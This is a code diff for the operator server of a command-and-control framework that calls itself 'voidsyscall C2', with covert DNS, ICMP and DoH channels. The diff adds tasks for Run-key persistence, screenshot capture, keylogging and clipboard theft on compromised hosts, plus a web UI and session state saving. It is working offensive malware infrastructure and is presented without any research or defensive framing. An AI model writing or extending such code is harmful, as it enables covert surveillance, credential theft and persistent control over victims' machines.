@@ -18,12 +18,15 @@ import (
 )
 
 type Server struct {
-	sessions  *SessionManager
-	config    *ServerConfig
-	ctx       context.Context
-	cancel    context.CancelFunc
-	downloads map[[16]byte]string
-	dlMu      sync.Mutex
+	sessions       *SessionManager
+	config         *ServerConfig
+	ctx            context.Context
+	cancel         context.CancelFunc
+	downloads      map[[16]byte]string
+	dlMu           sync.Mutex
+	screenshots    map[[16]byte]string
+	shotsMu        sync.Mutex
+	screenshotsDir string
 }
 
 type ServerConfig struct {
@@ -39,6 +42,8 @@ type ServerConfig struct {
 	CertFile   string
 	KeyFile    string
 	LogFile    string
+	WebAddr    string
+	StateFile  string
 }
 
 type TaskType uint8
@@ -60,6 +65,10 @@ const (
 	TaskToken       TaskType = 0x14
 	TaskProcs       TaskType = 0x15
 	TaskKillProc    TaskType = 0x16
+	TaskPersist     TaskType = 0x17
+	TaskScreenshot  TaskType = 0x18
+	TaskKeylog      TaskType = 0x19
+	TaskClipboard   TaskType = 0x1A
 )
 
 func taskTypeName(t TaskType) string {
@@ -94,6 +103,14 @@ func taskTypeName(t TaskType) string {
 		return "procs"
 	case TaskKillProc:
 		return "killproc"
+	case TaskPersist:
+		return "persist"
+	case TaskScreenshot:
+		return "shot"
+	case TaskKeylog:
+		return "keylog"
+	case TaskClipboard:
+		return "clipboard"
 	case TaskExit:
 		return "exit"
 	default:
@@ -103,18 +120,28 @@ func taskTypeName(t TaskType) string {
 
 func NewServer(cfg *ServerConfig) *Server {
 	ctx, cancel := context.WithCancel(context.Background())
+	shotsDir := "screenshots"
+	_ = os.MkdirAll(shotsDir, 0700)
 	return &Server{
-		sessions:  NewSessionManager(),
-		config:    cfg,
-		ctx:       ctx,
-		cancel:    cancel,
-		downloads: make(map[[16]byte]string),
+		sessions:       NewSessionManager(),
+		config:         cfg,
+		ctx:            ctx,
+		cancel:         cancel,
+		downloads:      make(map[[16]byte]string),
+		screenshots:    make(map[[16]byte]string),
+		screenshotsDir: shotsDir,
 	}
 }
 
 func (s *Server) Run() error {
 	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
 	log.SetOutput(os.Stdout)
+
+	if s.config.StateFile != "" {
+		if err := s.LoadState(s.config.StateFile); err != nil {
+			log.Printf("%s[-] State load: %v%s", AnsiRed, err, AnsiReset)
+		}
+	}
 
 	log.Printf("%s[+] voidsyscall C2 starting%s", AnsiGreen, AnsiReset)
 	log.Printf("%s[+] HTTP:%s %s%s:%d%s", AnsiGreen, AnsiReset, AnsiCyan, s.config.HTTPAddr, s.config.HTTPSPort, AnsiReset)
@@ -128,6 +155,7 @@ func (s *Server) Run() error {
 	go s.startDNSServer()
 	go s.startICMPServer()
 	go s.startDOHServer()
+	s.startWebUI()
 
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
@@ -135,6 +163,13 @@ func (s *Server) Run() error {
 	<-sigChan
 	log.Printf("%s[!] Shutting down...%s", AnsiYellow, AnsiReset)
 	s.cancel()
+	if s.config.StateFile != "" {
+		if err := s.SaveState(s.config.StateFile); err != nil {
+			log.Printf("%s[-] State save: %v%s", AnsiRed, err, AnsiReset)
+		} else {
+			log.Printf("%s[+] State saved to %s%s", AnsiGreen, s.config.StateFile, AnsiReset)
+		}
+	}
 	time.Sleep(1 * time.Second)
 	return nil
 }
@@ -171,8 +206,8 @@ func (s *Server) startHTTPServer() {
 
 func (s *Server) startDNSServer() {
 	dnsCfg := &channels.Config{
-		DNSAddr:  s.config.DNSAddr,
-		DNSPort:  s.config.DNSPort,
+		DNSAddr:   s.config.DNSAddr,
+		DNSPort:   s.config.DNSPort,
 		JitterMin: 0,
 		JitterMax: 0,
 	}
@@ -321,6 +356,24 @@ func (s *Server) handleMessage(msg *channels.Message) *channels.Message {
 			}
 		}
 
+		// Screenshot: write the raw BMP to the shots directory.
+		s.shotsMu.Lock()
+		shotPath, isShot := s.screenshots[result.TaskID]
+		delete(s.screenshots, result.TaskID)
+		s.shotsMu.Unlock()
+		if isShot {
+			if status == 0 && len(output) > 0 {
+				if err := os.WriteFile(shotPath, output, 0644); err != nil {
+					log.Printf("%s[-] Screenshot to %s failed: %v%s", AnsiRed, shotPath, err, AnsiReset)
+				} else {
+					log.Printf("%s[+] Screenshot %d bytes -> %s%s%s",
+						AnsiGreen, len(output), AnsiCyan, shotPath, AnsiReset)
+				}
+			} else {
+				log.Printf("%s[-] Screenshot failed (status=%d)%s", AnsiRed, status, AnsiReset)
+			}
+		}
+
 		statusColor := AnsiGreen
 		if status != 0 {
 			statusColor = AnsiRed
@@ -328,7 +381,7 @@ func (s *Server) handleMessage(msg *channels.Message) *channels.Message {
 		log.Printf("%s[+] Result from %s%s%s %sstatus=%d %s%s%s",
 			AnsiGreen, AnsiMagenta, hexID, AnsiReset,
 			statusColor, status, AnsiYellow, elapsedStr, AnsiReset)
-		if len(output) > 0 && !isDownload {
+		if len(output) > 0 && !isDownload && !isShot {
 			if len(output) > 512 {
 				log.Printf("%s[%d bytes]%s", AnsiDim, len(output), AnsiReset)
 			} else {
@@ -462,6 +515,40 @@ func (s *Server) RunDownload(sessionID [16]byte, remotePath, localPath string) e
 	s.dlMu.Unlock()
 
 	return nil
+}
+
+// RunScreenshot queues a screen capture. The BMP bytes arriving in the
+// result are routed into screenshots/<task-hex>.bmp.
+func (s *Server) RunScreenshot(sessionID [16]byte) error {
+	session, ok := s.sessions.Get(sessionID)
+	if !ok {
+		return fmt.Errorf("session %x not found", sessionID[:8])
+	}
+	taskID := makeTaskID()
+	task := &Task{Type: uint8(TaskScreenshot)}
+	copy(task.ID[:], taskID[:])
+	session.EnqueueTask(task)
+	session.RecordTask(taskID)
+
+	s.shotsMu.Lock()
+	s.screenshots[taskID] = fmt.Sprintf("%s%x.bmp", s.screenshotsDir+string(os.PathSeparator), taskID[:8])
+	s.shotsMu.Unlock()
+	return nil
+}
+
+// RunKeylog controls the agent keylogger: 1=start, 2=stop, 3=dump.
+func (s *Server) RunKeylog(sessionID [16]byte, sub byte) error {
+	return s.EnqueueTask(sessionID, TaskKeylog, []byte{sub})
+}
+
+// RunClipboard pulls the current clipboard CF_UNICODETEXT.
+func (s *Server) RunClipboard(sessionID [16]byte) error {
+	return s.EnqueueTask(sessionID, TaskClipboard, nil)
+}
+
+// RunPersist registers the agent image in the current user's Run key.
+func (s *Server) RunPersist(sessionID [16]byte, valueName string) error {
+	return s.EnqueueTask(sessionID, TaskPersist, []byte(valueName))
 }
 
 // RunUpload queues a file write on the target. Wire format:
